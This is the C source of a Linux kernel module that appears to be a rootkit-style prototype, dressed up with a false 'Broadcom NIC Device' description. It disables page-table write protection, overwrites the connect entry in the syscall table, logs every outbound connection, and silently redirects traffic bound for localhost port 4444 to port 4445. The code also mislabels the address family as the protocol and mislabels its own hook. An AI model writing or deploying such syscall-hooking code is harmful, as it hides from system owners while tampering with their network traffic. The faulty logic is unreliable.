#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>
#include <linux/kernel.h>

#include <linux/in.h> //Networking functions header

//#include <math.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/uaccess.h>



MODULE_LICENSE("GPL");
MODULE_AUTHOR("Broadcom");
MODULE_DESCRIPTION("NIC Device");
MODULE_VERSION("1.0");


unsigned long **SYS_CALL_TABLE;



//Adaptation for 5.0.3.42 and lower (CR4 pinning and CR0 bypass)
void EnablePageWriting(unsigned long address){
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);

	if(pte->pte &~ _PAGE_RW){
		pte->pte |= _PAGE_RW;
	}
}

void DisablePageWriting(unsigned long address){
	unsigned int level;

	pte_t *pte = lookup_address(address, &level);

	pte->pte = pte->pte &~ _PAGE_RW;

} 

//Define network protocols
#define TCP 0x2
#define UDP 0x1


//See notes for overview of IP addressing in mememory 



// store IP string (little-endian)
unsigned char IP[32] = {'\0'};

// This function converts int to hex & return str
char * inet_ntoa(int HexValue){ //network to integer (ish)
		memset(IP, 0, sizeof(IP));

		unsigned char first  = (HexValue >> 24) & 0xff;
		unsigned char second = (HexValue >> 16) & 0xff;
		unsigned char third  = (HexValue >> 8)  & 0xff;
		unsigned char fourth = HexValue         & 0xff;

		size_t size  = sizeof(IP) / sizeof(IP[0]);
        //Switches little-endian to readable form
		snprintf(IP , size  ,"%d.%d.%d.%d" , fourth, third , second , first);

return IP;
}


asmlinkage int ( *original_Connect ) (int fd, struct sockaddr __user *uservaddr, int addrlen); 
//modified open call, fd = file descriptor  
asmlinkage int	HookConnect(int fd, struct sockaddr __user *uservaddr, int addrlen){

	struct sockaddr_in addr; //from in.h header 

    //get params from user-land
	copy_from_user(&addr, uservaddr, sizeof(struct sockaddr_in));

	int IPHEX            =  addr.sin_addr.s_addr; //get the IP address in hex
	unsigned short PORT  =  addr.sin_port;        //get port
	int PROTO            =  addr.sin_family;      //get protocol

	char *IpString   = inet_ntoa(IPHEX);
	

	if(PROTO == TCP){
		printk("TCP CONNECTION STARTED -- TO  %s PORT 0x%x",  IpString, PORT ); 
	}
	if(PROTO == UDP){
		printk("UDP CONNECTION STARTED -- TO  %s PORT 0x%x",  IpString, PORT );
    
	}


    if (strcmp(IpString, "127.0.0.1") == 0 && (PORT == 0x5c11)){
        addr.sin_port = 0x5d11; //make port one higher

        

        unsigned short PORT = addr.sin_port;

        printk("Moving traffic to port %s :: 0x%x", IpString, PORT);

        //copy backto stack
        copy_to_user(uservaddr, &addr, sizeof(struct sockaddr_in));
    }


  return ( *original_Connect ) (fd, uservaddr, addrlen);
}


// Set hooks
static int __init SetHooks(void) {
	// Get Syscall Table
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);

  // Opens the memory pages to be written
	EnablePageWriting((unsigned long )SYS_CALL_TABLE);

  // Replaces Pointer Of Syscall_open on our syscall.
	original_Connect = (void*)SYS_CALL_TABLE[__NR_connect];
	SYS_CALL_TABLE[__NR_connect] = (unsigned long*)HookConnect;
	DisablePageWriting((unsigned long )SYS_CALL_TABLE);

	return 0;
}




//Called on module exit/removal (rmmod)
static void __exit HookCleanup(void) {

	// Clean up our Hooks
	EnablePageWriting((unsigned long )SYS_CALL_TABLE);
	SYS_CALL_TABLE[__NR_connect] = (unsigned long*)original_Connect;
	DisablePageWriting((unsigned long )SYS_CALL_TABLE);
	printk(KERN_INFO "HooksCleaned Up!");
}

module_init(SetHooks);
module_exit(HookCleanup);




//                                   - Notes -

/*

    ~> This program forms the framework by which we can retrive network stack messages 
    and inbound and outbound connections on the machine
    ~> It also implements the basic functionality to redirect these connections  


    ~> netcat for testing port redirection
        _> nc -l -p 4445
            ~>TCP Port


struct sockaddr_in {
  __kernel_sa_family_t	sin_family;	 Address family	
  __be16		sin_port;	 Port number			
  struct in_addr	sin_addr;	 Internet address		
   Pad to size of `struct sockaddr'. 
  unsigned char		__pad[__SOCK_SIZE__ - sizeof(short int) -
  sizeof(unsigned short int) - sizeof(struct in_addr)];
};
In memory Ip addresses are stored like so 
01.0.0.127  == 01 00 00 7f
*/




/*
https://github.com/torvalds/linux/blob/master/net/socket.c
int __sys_connect(int fd, struct sockaddr __user *uservaddr, int addrlen)
{
	int ret = -EBADF;
	struct fd f;
	f = fdget(fd);
	if (f.file) {
		struct sockaddr_storage address;
		ret = move_addr_to_kernel(uservaddr, addrlen, &address);
		if (!ret)
			ret = __sys_connect_file(f.file, &address, addrlen, 0);
		if (f.flags)
			fput(f.file);
	}
	return ret;
}
SYSCALL_DEFINE3(connect, int, fd, struct sockaddr __user *, uservaddr,
		int, addrlen)
{
	return __sys_connect(fd, uservaddr, addrlen);
}
enum sock_type {
	SOCK_STREAM	= 1,
	SOCK_DGRAM	= 2,
	SOCK_RAW	= 3,
	SOCK_RDM	= 4,
	SOCK_SEQPACKET	= 5,
	SOCK_DCCP	= 6,
	SOCK_PACKET	= 10,
};
retn from STRACE
connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16) = -1 ECONNREFUSED (Connection refused)
*/